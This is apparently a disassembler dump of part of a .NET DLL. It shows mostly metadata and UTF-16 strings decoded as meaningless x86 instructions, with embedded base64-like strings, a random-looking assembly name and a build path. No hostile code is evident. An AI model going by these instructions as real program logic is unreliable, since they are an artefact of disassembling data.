10004c80:	6b 00 78             	imul   $0x78,(%eax),%eax
10004c83:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
10004c87:	00 31                	add    %dh,(%ecx)
10004c89:	00 70 00             	add    %dh,0x0(%eax)
10004c8c:	6a 00                	push   $0x0
10004c8e:	00 15 50 00 6c 00    	add    %dl,0x6c0050
10004c94:	34 00                	xor    $0x0,%al
10004c96:	57                   	push   %edi
10004c97:	00 72 00             	add    %dh,0x0(%edx)
10004c9a:	4c                   	dec    %esp
10004c9b:	00 4b 00             	add    %cl,0x0(%ebx)
10004c9e:	53                   	push   %ebx
10004c9f:	00 5a 00             	add    %bl,0x0(%edx)
10004ca2:	63 00                	arpl   %eax,(%eax)
10004ca4:	00 80 b9 52 00 56    	add    %al,0x560052b9(%eax)
10004caa:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004cae:	00 5a 00             	add    %bl,0x0(%edx)
10004cb1:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004cb4:	00 7a 00             	add    %bh,0x0(%edx)
10004cb7:	4d                   	dec    %ebp
10004cb8:	00 6a 00             	add    %ch,0x0(%edx)
10004cbb:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004cbf:	51                   	push   %ecx
10004cc0:	00 55 00             	add    %dl,0x0(%ebp)
10004cc3:	74 00                	je     0x10004cc5
10004cc5:	70 00                	jo     0x10004cc7
10004cc7:	4e                   	dec    %esi
10004cc8:	00 55 00             	add    %dl,0x0(%ebp)
10004ccb:	56                   	push   %esi
10004ccc:	00 58 00             	add    %bl,0x0(%eax)
10004ccf:	56                   	push   %esi
10004cd0:	00 32                	add    %dh,(%edx)
10004cd2:	00 5a 00             	add    %bl,0x0(%edx)
10004cd5:	47                   	inc    %edi
10004cd6:	00 63 00             	add    %ah,0x0(%ebx)
10004cd9:	7a 00                	jp     0x10004cdb
10004cdb:	49                   	dec    %ecx
10004cdc:	00 33                	add    %dh,(%ebx)
10004cde:	00 5a 00             	add    %bl,0x0(%edx)
10004ce1:	30 00                	xor    %al,(%eax)
10004ce3:	46                   	inc    %esi
10004ce4:	00 46 00             	add    %al,0x0(%esi)
10004ce7:	56                   	push   %esi
10004ce8:	00 31                	add    %dh,(%ecx)
10004cea:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004cee:	00 52 00             	add    %dl,0x0(%edx)
10004cf1:	6e                   	outsb  %ds:(%esi),(%dx)
10004cf2:	00 4d 00             	add    %cl,0x0(%ebp)
10004cf5:	79 00                	jns    0x10004cf7
10004cf7:	4e                   	dec    %esi
10004cf8:	00 32                	add    %dh,(%edx)
10004cfa:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
10004cfe:	00 62 00             	add    %ah,0x0(%edx)
10004d01:	47                   	inc    %edi
10004d02:	00 56 00             	add    %dl,0x0(%esi)
10004d05:	48                   	dec    %eax
10004d06:	00 52 00             	add    %dl,0x0(%edx)
10004d09:	56                   	push   %esi
10004d0a:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004d0e:	00 5a 00             	add    %bl,0x0(%edx)
10004d11:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004d14:	00 7a 00             	add    %bh,0x0(%edx)
10004d17:	4d                   	dec    %ebp
10004d18:	00 6a 00             	add    %ch,0x0(%edx)
10004d1b:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004d1f:	51                   	push   %ecx
10004d20:	00 55 00             	add    %dl,0x0(%ebp)
10004d23:	56                   	push   %esi
10004d24:	00 58 00             	add    %bl,0x0(%eax)
10004d27:	56                   	push   %esi
10004d28:	00 32                	add    %dh,(%edx)
10004d2a:	00 5a 00             	add    %bl,0x0(%edx)
10004d2d:	47                   	inc    %edi
10004d2e:	00 63 00             	add    %ah,0x0(%ebx)
10004d31:	7a 00                	jp     0x10004d33
10004d33:	49                   	dec    %ecx
10004d34:	00 33                	add    %dh,(%ebx)
10004d36:	00 5a 00             	add    %bl,0x0(%edx)
10004d39:	30 00                	xor    %al,(%eax)
10004d3b:	46                   	inc    %esi
10004d3c:	00 56 00             	add    %dl,0x0(%esi)
10004d3f:	50                   	push   %eax
10004d40:	00 55 00             	add    %dl,0x0(%ebp)
10004d43:	56                   	push   %esi
10004d44:	00 58 00             	add    %bl,0x0(%eax)
10004d47:	56                   	push   %esi
10004d48:	00 32                	add    %dh,(%edx)
10004d4a:	00 5a 00             	add    %bl,0x0(%edx)
10004d4d:	47                   	inc    %edi
10004d4e:	00 63 00             	add    %ah,0x0(%ebx)
10004d51:	7a 00                	jp     0x10004d53
10004d53:	49                   	dec    %ecx
10004d54:	00 33                	add    %dh,(%ebx)
10004d56:	00 5a 00             	add    %bl,0x0(%edx)
10004d59:	30 00                	xor    %al,(%eax)
10004d5b:	45                   	inc    %ebp
10004d5c:	00 3d 00 00 15 45    	add    %bh,0x45150000
10004d62:	00 57 00             	add    %dl,0x0(%edi)
10004d65:	57                   	push   %edi
10004d66:	00 66 00             	add    %ah,0x0(%esi)
10004d69:	46                   	inc    %esi
10004d6a:	00 73 00             	add    %dh,0x0(%ebx)
10004d6d:	32 00                	xor    (%eax),%al
10004d6f:	37                   	aaa
10004d70:	00 67 00             	add    %ah,0x0(%edi)
10004d73:	41                   	inc    %ecx
10004d74:	00 00                	add    %al,(%eax)
10004d76:	00 00                	add    %al,(%eax)
10004d78:	ca ac b8             	lret   $0xb8ac
10004d7b:	9a 84 8e e4 45 a1 ab 	lcall  $0xaba1,$0x45e48e84
10004d82:	22 d1                	and    %cl,%dl
10004d84:	3e 7c 32             	jl,pt  0x10004db9
10004d87:	d7                   	xlat   %ds:(%ebx)
10004d88:	00 04 20             	add    %al,(%eax,%eiz,1)
10004d8b:	01 01                	add    %eax,(%ecx)
10004d8d:	08 03                	or     %al,(%ebx)
10004d8f:	20 00                	and    %al,(%eax)
10004d91:	01 05 20 01 01 11    	add    %eax,0x11010120
10004d97:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004d9a:	01 01                	add    %eax,(%ecx)
10004d9c:	0e                   	push   %cs
10004d9d:	04 20                	add    $0x20,%al
10004d9f:	01 01                	add    %eax,(%ecx)
10004da1:	02 0c 07             	add    (%edi,%eax,1),%cl
10004da4:	07                   	pop    %es
10004da5:	11 10                	adc    %edx,(%eax)
10004da7:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
10004daa:	18 18                	sbb    %bl,(%eax)
10004dac:	12 45 09             	adc    0x9(%ebp),%al
10004daf:	06                   	push   %es
10004db0:	10 01                	adc    %al,(%ecx)
10004db2:	01 08                	add    %ecx,(%eax)
10004db4:	1e                   	push   %ds
10004db5:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004db8:	01 11                	add    %edx,(%ecx)
10004dba:	10 02                	adc    %al,(%edx)
10004dbc:	06                   	push   %es
10004dbd:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004dc3:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004dc6:	00 12                	add    %dl,(%edx)
10004dc8:	61                   	popa
10004dc9:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004dce:	0e                   	push   %cs
10004dcf:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004dd4:	05 05 20 02 0e       	add    $0xe022005,%eax
10004dd9:	0e                   	push   %cs
10004dda:	0e                   	push   %cs
10004ddb:	04 00                	add    $0x0,%al
10004ddd:	01 01                	add    %eax,(%ecx)
10004ddf:	08 05 00 01 12 45    	or     %al,0x45120100
10004de5:	08 03                	or     %al,(%ebx)
10004de7:	20 00                	and    %al,(%eax)
10004de9:	02 06                	add    (%esi),%al
10004deb:	07                   	pop    %es
10004dec:	02 12                	add    (%edx),%dl
10004dee:	14 1d                	adc    $0x1d,%al
10004df0:	0e                   	push   %cs
10004df1:	05 15 12 55 01       	add    $0x1551215,%eax
10004df6:	0e                   	push   %cs
10004df7:	05 20 01 01 13       	add    $0x13010120,%eax
10004dfc:	00 08                	add    %cl,(%eax)
10004dfe:	00 03                	add    %al,(%ebx)
10004e00:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004e05:	75 06                	jne    0x10004e0d
10004e07:	15 12 79 02 0e       	adc    $0xe027912,%eax
10004e0c:	02 05 20 02 01 1c    	add    0x1c010220,%al
10004e12:	18 18                	sbb    %bl,(%eax)
10004e14:	10 01                	adc    %al,(%ecx)
10004e16:	02 15 12 80 81 01    	add    0x1818012,%dl
10004e1c:	1e                   	push   %ds
10004e1d:	00 15 12 80 81 01    	add    %dl,0x1818012
10004e23:	1e                   	push   %ds
10004e24:	00 15 12 79 02 1e    	add    %dl,0x1e027912
10004e2a:	00 02                	add    %al,(%edx)
10004e2c:	03 0a                	add    (%edx),%ecx
10004e2e:	01 0e                	add    %ecx,(%esi)
10004e30:	0d 10 01 01 1d       	or     $0x1d010110,%eax
10004e35:	1e                   	push   %ds
10004e36:	00 15 12 80 81 01    	add    %dl,0x1818012
10004e3c:	1e                   	push   %ds
10004e3d:	00 04 20             	add    %al,(%eax,%eiz,1)
10004e40:	01 08                	add    %ecx,(%eax)
10004e42:	08 04 00             	or     %al,(%eax,%eax,1)
10004e45:	01 0e                	add    %ecx,(%esi)
10004e47:	0e                   	push   %cs
10004e48:	05 20 01 02 13       	add    $0x13020120,%eax
10004e4d:	00 08                	add    %cl,(%eax)
10004e4f:	b7 7a                	mov    $0x7a,%bh
10004e51:	5c                   	pop    %esp
10004e52:	56                   	push   %esi
10004e53:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004e56:	89 02                	mov    %eax,(%edx)
10004e58:	06                   	push   %es
10004e59:	09 02                	or     %eax,(%edx)
10004e5b:	06                   	push   %es
10004e5c:	0e                   	push   %cs
10004e5d:	02 06                	add    (%esi),%al
10004e5f:	08 02                	or     %al,(%edx)
10004e61:	06                   	push   %es
10004e62:	06                   	push   %es
10004e63:	06                   	push   %es
10004e64:	06                   	push   %es
10004e65:	15 12 55 01 0e       	adc    $0xe015512,%eax
10004e6a:	08 00                	or     %al,(%eax)
10004e6c:	05 18 18 18 09       	add    $0x9181818,%eax
10004e71:	09 09                	or     %ecx,(%ecx)
10004e73:	06                   	push   %es
10004e74:	00 02                	add    %al,(%edx)
10004e76:	01 0e                	add    %ecx,(%esi)
10004e78:	1d 05 06 00 02       	sbb    $0x2000605,%eax
10004e7d:	02 18                	add    (%eax),%bl
10004e7f:	10 09                	adc    %cl,(%ecx)
10004e81:	0b 00                	or     (%eax),%eax
10004e83:	07                   	pop    %es
10004e84:	18 18                	sbb    %bl,(%eax)
10004e86:	18 09                	sbb    %cl,(%ecx)
10004e88:	18 18                	sbb    %bl,(%eax)
10004e8a:	09 10                	or     %edx,(%eax)
10004e8c:	18 0a                	sbb    %cl,(%edx)
10004e8e:	00 05 02 18 18 1d    	add    %al,0x1d181802
10004e94:	05 09 10 18 11       	add    $0x11181009,%eax
10004e99:	00 0a                	add    %cl,(%edx)
10004e9b:	02 0e                	add    (%esi),%cl
10004e9d:	0e                   	push   %cs
10004e9e:	18 18                	sbb    %bl,(%eax)
10004ea0:	02 09                	add    (%ecx),%cl
10004ea2:	18 0e                	sbb    %cl,(%esi)
10004ea4:	10 11                	adc    %dl,(%ecx)
10004ea6:	10 10                	adc    %dl,(%eax)
10004ea8:	11 0c 04             	adc    %ecx,(%esp,%eax,1)
10004eab:	00 01                	add    %al,(%ecx)
10004ead:	02 18                	add    (%eax),%bl
10004eaf:	03 00                	add    (%eax),%eax
10004eb1:	00 0e                	add    %cl,(%esi)
10004eb3:	04 20                	add    $0x20,%al
10004eb5:	01 02                	add    %eax,(%edx)
10004eb7:	0e                   	push   %cs
10004eb8:	08 01                	or     %al,(%ecx)
10004eba:	00 08                	add    %cl,(%eax)
10004ebc:	00 00                	add    %al,(%eax)
10004ebe:	00 00                	add    %al,(%eax)
10004ec0:	00 1e                	add    %bl,(%esi)
10004ec2:	01 00                	add    %eax,(%eax)
10004ec4:	01 00                	add    %eax,(%eax)
10004ec6:	54                   	push   %esp
10004ec7:	02 16                	add    (%esi),%dl
10004ec9:	57                   	push   %edi
10004eca:	72 61                	jb     0x10004f2d
10004ecc:	70 4e                	jo     0x10004f1c
10004ece:	6f                   	outsl  %ds:(%esi),(%dx)
10004ecf:	6e                   	outsb  %ds:(%esi),(%dx)
10004ed0:	45                   	inc    %ebp
10004ed1:	78 63                	js     0x10004f36
10004ed3:	65 70 74             	gs jo  0x10004f4a
10004ed6:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004edd:	77 73                	ja     0x10004f52
10004edf:	01 08                	add    %ecx,(%eax)
10004ee1:	01 00                	add    %eax,(%eax)
10004ee3:	02 00                	add    (%eax),%al
10004ee5:	00 00                	add    %al,(%eax)
10004ee7:	00 00                	add    %al,(%eax)
10004ee9:	13 01                	adc    (%ecx),%eax
10004eeb:	00 0e                	add    %cl,(%esi)
10004eed:	53                   	push   %ebx
10004eee:	64 74 68             	fs je  0x10004f59
10004ef1:	77 4d                	ja     0x10004f40
10004ef3:	52                   	push   %edx
10004ef4:	39 34 57             	cmp    %esi,(%edi,%edx,2)
10004ef7:	56                   	push   %esi
10004ef8:	6e                   	outsb  %ds:(%esi),(%dx)
10004ef9:	58                   	pop    %eax
10004efa:	79 00                	jns    0x10004efc
10004efc:	00 05 01 00 00 00    	add    %al,0x1
10004f02:	00 17                	add    %dl,(%edi)
10004f04:	01 00                	add    %eax,(%eax)
10004f06:	12 43 6f             	adc    0x6f(%ebx),%al
10004f09:	70 79                	jo     0x10004f84
10004f0b:	72 69                	jb     0x10004f76
10004f0d:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004f13:	20 20                	and    %ah,(%eax)
10004f15:	32 30                	xor    (%eax),%dh
10004f17:	32 34 00             	xor    (%eax,%eax,1),%dh
10004f1a:	00 29                	add    %ch,(%ecx)
10004f1c:	01 00                	add    %eax,(%eax)
10004f1e:	24 44                	and    $0x44,%al
10004f20:	44                   	inc    %esp
10004f21:	44                   	inc    %esp
10004f22:	33 41 41             	xor    0x41(%ecx),%eax
10004f25:	36 35 2d 36 34 33    	ss xor $0x3334362d,%eax
10004f2b:	35 2d 34 36 43       	xor    $0x4336342d,%eax
10004f30:	41                   	inc    %ecx
10004f31:	2d 41 44 30 37       	sub    $0x37304441,%eax
10004f36:	2d 34 32 45 34       	sub    $0x34453234,%eax
10004f3b:	38 39                	cmp    %bh,(%ecx)
10004f3d:	37                   	aaa
10004f3e:	45                   	inc    %ebp
10004f3f:	37                   	aaa
10004f40:	44                   	inc    %esp
10004f41:	31 44 00 00          	xor    %eax,0x0(%eax,%eax,1)
10004f45:	0c 01                	or     $0x1,%al
10004f47:	00 07                	add    %al,(%edi)
10004f49:	31 2e                	xor    %ebp,(%esi)
10004f4b:	30 2e                	xor    %ch,(%esi)
10004f4d:	30 2e                	xor    %ch,(%esi)
10004f4f:	30 00                	xor    %al,(%eax)
10004f51:	00 49 01             	add    %cl,0x1(%ecx)
10004f54:	00 1a                	add    %bl,(%edx)
10004f56:	2e 4e                	cs dec %esi
10004f58:	45                   	inc    %ebp
10004f59:	54                   	push   %esp
10004f5a:	46                   	inc    %esi
10004f5b:	72 61                	jb     0x10004fbe
10004f5d:	6d                   	insl   (%dx),%es:(%edi)
10004f5e:	65 77 6f             	gs ja  0x10004fd0
10004f61:	72 6b                	jb     0x10004fce
10004f63:	2c 56                	sub    $0x56,%al
10004f65:	65 72 73             	gs jb  0x10004fdb
10004f68:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10004f6f:	38 01                	cmp    %al,(%ecx)
10004f71:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10004f75:	46                   	inc    %esi
10004f76:	72 61                	jb     0x10004fd9
10004f78:	6d                   	insl   (%dx),%es:(%edi)
10004f79:	65 77 6f             	gs ja  0x10004feb
10004f7c:	72 6b                	jb     0x10004fe9
10004f7e:	44                   	inc    %esp
10004f7f:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10004f86:	61                   	popa
10004f87:	6d                   	insl   (%dx),%es:(%edi)
10004f88:	65 12 2e             	adc    %gs:(%esi),%ch
10004f8b:	4e                   	dec    %esi
10004f8c:	45                   	inc    %ebp
10004f8d:	54                   	push   %esp
10004f8e:	20 46 72             	and    %al,0x72(%esi)
10004f91:	61                   	popa
10004f92:	6d                   	insl   (%dx),%es:(%edi)
10004f93:	65 77 6f             	gs ja  0x10005005
10004f96:	72 6b                	jb     0x10005003
10004f98:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10004f9b:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
10004fa6:	00 00                	add    %al,(%eax)
10004fa8:	b4 93                	mov    $0x93,%ah
10004faa:	cb                   	lret
10004fab:	99                   	cltd
10004fac:	00 00                	add    %al,(%eax)
10004fae:	00 00                	add    %al,(%eax)
10004fb0:	02 00                	add    (%eax),%al
10004fb2:	00 00                	add    %al,(%eax)
10004fb4:	5b                   	pop    %ebx
10004fb5:	00 00                	add    %al,(%eax)
10004fb7:	00 dc                	add    %bl,%ah
10004fb9:	4f                   	dec    %edi
10004fba:	00 00                	add    %al,(%eax)
10004fbc:	dc 31                	fdivl  (%ecx)
	...
10004fca:	00 00                	add    %al,(%eax)
10004fcc:	10 00                	adc    %al,(%eax)
	...
10004fda:	00 00                	add    %al,(%eax)
10004fdc:	52                   	push   %edx
10004fdd:	53                   	push   %ebx
10004fde:	44                   	inc    %esp
10004fdf:	53                   	push   %ebx
10004fe0:	21 de                	and    %ebx,%esi
10004fe2:	ea 98 e9 ec 27 4f a8 	ljmp   $0xa84f,$0x27ece998
10004fe9:	d1 ba c4 d5 e2 f2    	sarl   $1,-0xd1d2a3c(%edx)
10004fef:	24 01                	and    $0x1,%al
10004ff1:	00 00                	add    %al,(%eax)
10004ff3:	00 43 3a             	add    %al,0x3a(%ebx)
10004ff6:	5c                   	pop    %esp
10004ff7:	61                   	popa
10004ff8:	70 70                	jo     0x1000506a
10004ffa:	5c                   	pop    %esp
10004ffb:	61                   	popa
10004ffc:	73 73                	jae    0x10005071
10004ffe:	65 74 73             	gs je  0x10005074
10005001:	5c                   	pop    %esp
10005002:	62 69 6e             	bound  %ebp,0x6e(%ecx)
10005005:	5c                   	pop    %esp
10005006:	74 65                	je     0x1000506d
10005008:	6d                   	insl   (%dx),%es:(%edi)
10005009:	70 2d                	jo     0x10005038
1000500b:	35 31 32 63 30       	xor    $0x30633231,%eax
10005010:	66 39 39             	cmp    %di,(%ecx)
10005013:	38 33                	cmp    %dh,(%ebx)
10005015:	38 34 5c             	cmp    %dh,(%esp,%ebx,2)
10005018:	6f                   	outsl  %ds:(%esi),(%dx)
10005019:	62 6a 5c             	bound  %ebp,0x5c(%edx)
1000501c:	52                   	push   %edx
1000501d:	65 6c                	gs insb (%dx),%es:(%edi)
1000501f:	65 61                	gs popa
10005021:	73 65                	jae    0x10005088
10005023:	5c                   	pop    %esp
10005024:	53                   	push   %ebx
10005025:	64 74 68             	fs je  0x10005090
10005028:	77 4d                	ja     0x10005077
1000502a:	52                   	push   %edx
1000502b:	39 34 57             	cmp    %esi,(%edi,%edx,2)
1000502e:	56                   	push   %esi
1000502f:	6e                   	outsb  %ds:(%esi),(%dx)
10005030:	58                   	pop    %eax
10005031:	79 2e                	jns    0x10005061
10005033:	70 64                	jo     0x10005099
10005035:	62 00                	bound  %eax,(%eax)
10005037:	5f                   	pop    %edi
10005038:	50                   	push   %eax
	...
10005041:	00 00                	add    %al,(%eax)
10005043:	79 50                	jns    0x10005095
10005045:	00 00                	add    %al,(%eax)
10005047:	00 20                	add    %ah,(%eax)
	...
1000505d:	00 00                	add    %al,(%eax)
1000505f:	6b 50 00 00          	imul   $0x0,0x0(%eax),%edx
	...
1000506b:	00 00                	add    %al,(%eax)
1000506d:	5f                   	pop    %edi
1000506e:	43                   	inc    %ebx
1000506f:	6f                   	outsl  %ds:(%esi),(%dx)
10005070:	72 44                	jb     0x100050b6
10005072:	6c                   	insb   (%dx),%es:(%edi)
10005073:	6c                   	insb   (%dx),%es:(%edi)
10005074:	4d                   	dec    %ebp
10005075:	61                   	popa
10005076:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
1000507d:	72 65                	jb     0x100050e4
1000507f:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10005083:	6c                   	insb   (%dx),%es:(%edi)
10005084:	00 00                	add    %al,(%eax)
10005086:	00 00                	add    %al,(%eax)
10005088:	00 00                	add    %al,(%eax)
1000508a:	ff 25 00 20 00 10    	jmp    *0x10002000
